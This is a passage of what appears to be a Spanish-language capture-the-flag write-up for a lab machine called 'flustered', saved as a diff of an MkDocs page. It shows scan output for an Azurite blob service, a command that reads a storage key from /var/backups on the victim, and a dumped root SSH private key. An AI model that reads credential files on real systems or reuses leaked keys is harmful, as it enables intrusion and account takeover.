+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a><span class="p">|</span>     Connection: close
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a><span class="p">|</span>   GetRequest: 
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="p">|</span>     HTTP/1.1 <span class="m">500</span> Internal Server Error
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a><span class="p">|</span>     Server: Azurite-Blob/3.14.3
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a><span class="p">|</span>     Date: Sun, <span class="m">04</span> Sep <span class="m">2022</span> <span class="m">01</span>:24:51 GMT
+<a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a><span class="p">|</span>     Connection: close
+<a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a>&gt; apt update
+<a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a>&gt; apt install snapd
+<a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a>&gt; snap install storage-explorer
+<a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>&gt; storage-explorer <span class="o">(</span>el programa me deja iniciarlo con un usuario no root<span class="o">)</span>
+<a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a>
+<a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a><span class="c1"># Tras iniciarlo se adjunta un recurso y se selecciona Emulador de almacenamiento local, y usamos el usuario jennifer y la key de la máquina víctima:  </span>
+<a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a>jennifer@flustered:/tmp$ cat /var/backups/key 
+<a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a>FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ<span class="o">==</span>
+<a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a>
+<a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a><span class="c1"># Solo me ha funcionado con la version 1.22.1, lo mejor es usarlo desde Windows</span>
+<a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a>
+<a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a><span class="c1"># Root id_rsa:</span>
+<a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a>-----BEGIN OPENSSH PRIVATE KEY-----
+<a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+<a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a>NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi
+<a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a>NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q
+<a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a>D0kT7hX+MTyVLPKqzs+AbPTzY2GOxUNMAE1wbmV9kl4P28dU7tkNKa2eXBm6GY+tQosz/j
+<a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a>5MAuF5Nq7WQ26ngBfQHSwUkC5+FCzD5yA1NnvcGIuKu0SK0J+jPSp50tY8yTkF72IuTRsM
+<a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a>Lvo9dkqyzAa1QoHxkLtm8lptX62BEIlnxYA2zUntlj0g6/G/OMKwkosTvJTK0fdMrloiQn
+<a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a>jjnoNvikGwAAA8jGJr9zxia/cwAAAAdzc2gtcnNhAAABAQC+t+J9alYQC3F0cbvBMiosZg
+<a id="__codelineno-11-46" name="__codelineno-11-46" href="#__codelineno-11-46"></a>8mjdMn/4fOutgfLMMEAOk0SXZT6+I1hbY3r0XqfRiN3tdmjHr3FvgAbQU57r9IReL573rQ
+<a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a>vTbeW4ntRRolTGtq+LgGoA9puJnlAPSRPuFf4xPJUs8qrOz4Bs9PNjYY7FQ0wATXBuZX2S
+<a id="__codelineno-11-48" name="__codelineno-11-48" href="#__codelineno-11-48"></a>Xg/bx1Tu2Q0prZ5cGboZj61CizP+PkwC4Xk2rtZDbqeAF9AdLBSQLn4ULMPnIDU2e9wYi4
+<a id="__codelineno-11-49" name="__codelineno-11-49" href="#__codelineno-11-49"></a>q7RIrQn6M9KnnS1jzJOQXvYi5NGwwu+j12SrLMBrVCgfGQu2byWm1frYEQiWfFgDbNSe2W
+<a id="__codelineno-11-50" name="__codelineno-11-50" href="#__codelineno-11-50"></a>PSDr8b84wrCSixO8lMrR90yuWiJCeOOeg2+KQbAAAAAwEAAQAAAQEAqqr1dJPu9ia3XaPV
+<a id="__codelineno-11-51" name="__codelineno-11-51" href="#__codelineno-11-51"></a>h9qzYM3n6vFpr1Z9GqObebJdxbxm9FJ1ID5rTMgeOxCPOXq+uV5cVbmK5IjaX88vqRscc7
+<a id="__codelineno-11-52" name="__codelineno-11-52" href="#__codelineno-11-52"></a>mOl2kV96wLaMpz0C9RaWVMjwqJ6+vaPxpiJUtIkJ27o0oaz8NZ/m+HE6FMbS8vE/iQli/r
+<a id="__codelineno-11-53" name="__codelineno-11-53" href="#__codelineno-11-53"></a>ZN0Yzi5VNlT6C+KKX9GBD8j4xIC6Gs1bblVmWz71V9JkfpFRdBAlk7/MHLNhg7rdHywo27
+<a id="__codelineno-11-54" name="__codelineno-11-54" href="#__codelineno-11-54"></a>H0XBvjpbBVbEpLykvHxNb4Ik5TQ5RGioPU2SftgDyy94oksDpM6u1uj7gBQbnPZn7jzMG7
+<a id="__codelineno-11-55" name="__codelineno-11-55" href="#__codelineno-11-55"></a>6bj54dlyf5bvL2q/Jq63tQw6KGbcAcbpsSwmn53e0CaXqQAAAIEA0JIB140zTamK2c5L9K
+<a id="__codelineno-11-56" name="__codelineno-11-56" href="#__codelineno-11-56"></a>gBeRXKZKZ4UtvVtZPKIdlbflUFheDNwj5FtCMICFOLV+cyBQcwJJv135lj8A6OAbz4z9mT
+<a id="__codelineno-11-57" name="__codelineno-11-57" href="#__codelineno-11-57"></a>dw+4aCnnAZactRHECxxjaPVr9qpN9CDFFyPDa5izQ/oqUQMdgztEJxjHFrWzGy5QHExKpB
+<a id="__codelineno-11-58" name="__codelineno-11-58" href="#__codelineno-11-58"></a>cWv9mhSs3E4GMAAACBAPlANmPbMgfKQEh4tya3sPvUIxvy46pX8GcAvNK++bGU195oY7a6
+<a id="__codelineno-11-59" name="__codelineno-11-59" href="#__codelineno-11-59"></a>3w7L62mge95O8zjUOvNoCmBs4dpPKXLOdpk3XpRZSm90Wgxe85xMBHhW2kwIBfqPHUiZj+
+<a id="__codelineno-11-60" name="__codelineno-11-60" href="#__codelineno-11-60"></a>A5jKEYSTWjFQfHEVrIbUTAJ7dixtuKLdATxdgYiuzxS/AmSPhvAAAAgQDD4e3lJMh1KVop
+<a id="__codelineno-11-61" name="__codelineno-11-61" href="#__codelineno-11-61"></a>a7xdCR3xhXCQ7Jm7u/4f5txWS4DEuRVUmvQ3pqqg72nX27vCmPN6/moidXnxVqJ06K/40l
+<a id="__codelineno-11-62" name="__codelineno-11-62" href="#__codelineno-11-62"></a>KMQG/hRwUGBMxPBVec5O63H5FBd9g3cVUSMA4Fwy6hUWjYMXcNVwugogkW/T0XLUp/w+X/
+<a id="__codelineno-11-63" name="__codelineno-11-63" href="#__codelineno-11-63"></a><span class="nv">TGdaVjEDWhNuypttFQAAAA5yb290QGZsdXN0ZXJlZAECAw</span><span class="o">==</span>
+<a id="__codelineno-11-64" name="__codelineno-11-64" href="#__codelineno-11-64"></a>-----END OPENSSH PRIVATE KEY-----
+</code></pre></div></p>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../epsilon/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Epsilon" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Epsilon
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../goodgames/" class="md-footer__link md-footer__link--next" aria-label="Next: Goodgames" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Goodgames
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
